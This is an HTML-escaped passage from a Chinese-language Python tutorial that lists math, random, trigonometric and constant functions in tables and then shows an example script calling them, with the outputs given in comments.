&lt;td&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-ceil.html&#34;&gt;ceil(x)&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;返回数字的上入整数，如math.ceil(4.1) 返回 5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cmp(x, y)&lt;/td&gt;
&lt;td&gt;如果 x &amp;lt; y 返回 -1, 如果 x == y 返回 0, 如果 x &amp;gt; y 返回 1。 &lt;strong&gt;Python 3 已废弃，使用 (x&amp;gt;y)-(x&amp;lt;y) 替换&lt;/strong&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-exp.html&#34;&gt;exp(x)&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-fabs.html&#34;&gt;fabs(x)&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;返回数字的绝对值，如math.fabs(-10) 返回10.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-floor.html&#34;&gt;floor(x)&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;返回数字的下舍整数，如math.floor(4.9)返回 4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-log.html&#34;&gt;log(x)&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;如math.log(math.e)返回1.0,math.log(100,10)返回2.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-log10.html&#34;&gt;log10(x)&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;返回以10为基数的x的对数，如math.log10(100)返回 2.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-max.html&#34;&gt;max(x1, x2,…)&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;返回给定参数的最大值，参数可以为序列。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-min.html&#34;&gt;min(x1, x2,…)&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;返回给定参数的最小值，参数可以为序列。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-modf.html&#34;&gt;modf(x)&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-pow.html&#34;&gt;pow(x, y)&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;x**y 运算后的值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[round(x &lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-round.html&#34;&gt;,n])&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;返回浮点数 x 的四舍五入值，如给出 n 值，则代表舍入到小数点后的位数。&lt;strong&gt;其实准确的说是保留值将保留到离上一位更近的一端。&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-sqrt.html&#34;&gt;sqrt(x)&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;返回数字x的平方根。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;随机数函数&#34;&gt;&lt;a href=&#34;#随机数函数&#34; class=&#34;headerlink&#34; title=&#34;随机数函数&#34;&gt;&lt;/a&gt;随机数函数&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;函数&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-choice.html&#34;&gt;choice(seq)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;[randrange (&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-randrange.html&#34;&gt;start,] stop [,step])&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;从指定范围内，按指定基数递增的集合中获取一个随机数，基数默认值为 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-random.html&#34;&gt;random()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;随机生成下一个实数，它在[0,1)范围内。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;[seed(&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-seed.html&#34;&gt;x])&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-shuffle.html&#34;&gt;shuffle(lst)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;将序列的所有元素随机排序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-uniform.html&#34;&gt;uniform(x, y)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;随机生成下一个实数，它在[x,y]范围内。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;三角函数&#34;&gt;&lt;a href=&#34;#三角函数&#34; class=&#34;headerlink&#34; title=&#34;三角函数&#34;&gt;&lt;/a&gt;三角函数&lt;/h3&gt;&lt;p&gt;Python包括以下三角函数：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;函数&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-acos.html&#34;&gt;acos(x)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回x的反余弦弧度值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-asin.html&#34;&gt;asin(x)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回x的反正弦弧度值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-atan.html&#34;&gt;atan(x)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回x的反正切弧度值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-atan2.html&#34;&gt;atan2(y, x)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回给定的 X 及 Y 坐标值的反正切值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-cos.html&#34;&gt;cos(x)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回x的弧度的余弦值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-hypot.html&#34;&gt;hypot(x, y)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回欧几里德范数 sqrt(x&lt;em&gt;x + y&lt;/em&gt;y)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-sin.html&#34;&gt;sin(x)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回的x弧度的正弦值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-tan.html&#34;&gt;tan(x)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回x弧度的正切值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-degrees.html&#34;&gt;degrees(x)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;将弧度转换为角度,如degrees(math.pi/2) ， 返回90.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-radians.html&#34;&gt;radians(x)&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;将角度转换为弧度&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;数学常量&#34;&gt;&lt;a href=&#34;#数学常量&#34; class=&#34;headerlink&#34; title=&#34;数学常量&#34;&gt;&lt;/a&gt;数学常量&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;常量&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;pi&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;数学常量 pi（圆周率，一般以π来表示）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;e&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;数学常量 e，e即自然常数（自然常数）。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;函数示例&#34;&gt;&lt;a href=&#34;#函数示例&#34; class=&#34;headerlink&#34; title=&#34;函数示例&#34;&gt;&lt;/a&gt;函数示例&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; math  &lt;span class=&#34;token comment&#34;&gt;# 导入 math 模块&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;abs(-40) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;abs&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 内置&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# abs(-40) :  40&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;math.ceil(-45.17) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ceil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;45.17&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# math.ceil(-45.17) :  -45&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;math.exp(-45.17) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exp&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;45.17&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# math.exp(-45.17) :  2.4150062132629406e-20&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;math.fabs(-45.17) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fabs&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;45.17&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# math.fabs(-45.17) :  45.17&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;math.floor(-45.17) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;floor&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;45.17&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# math.floor(-45.17) :  -46&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;math.log(100.12) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100.12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# math.log(100.12) :  4.6063694665635735&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;math.log10(100.12) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log10&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100.12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# math.log10(100.12) :  2.0005208409361854&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;max(80, 100, 1000) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# max(80, 100, 1000) :  1000&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;min(80, 100, 1000) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# min(80, 100, 1000) :  80&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;math.modf(100.12) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;modf&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100.12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# math.modf(100.12) :  (0.12000000000000455, 100.0)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;math.pow(100, 2) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# math.pow(100, 2) :  10000.0&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 使用内置，查看输出结果区别&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;pow(100, 2) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# pow(100, 2) :  10000&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;round(-100.000056, 3) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;round&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100.000056&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# round(-100.000056, 3) :  -100.0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;math.sqrt(100) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sqrt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# math.sqrt(100) :  10.0&lt;/span&gt;


&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; random

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;从 range(100) 返回一个随机数 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;choice&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 从 range(100) 返回一个随机数 :  67&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;从列表中 [1, 2, 3, 5, 9]) 返回一个随机元素 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;choice&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 从列表中 [1, 2, 3, 5, 9]) 返回一个随机元素 :  5&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;从字符串中 &#39;Runoob&#39; 返回一个随机字符 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;choice&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 从 1-100 中选取一个奇数&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#从字符串中 &#39;Runoob&#39; 返回一个随机字符 :  n&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;randrange(1,100, 2) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;randrange&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# randrange(1,100, 2) :  45&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 从 0-99 选取一个随机数&lt;/span&gt;
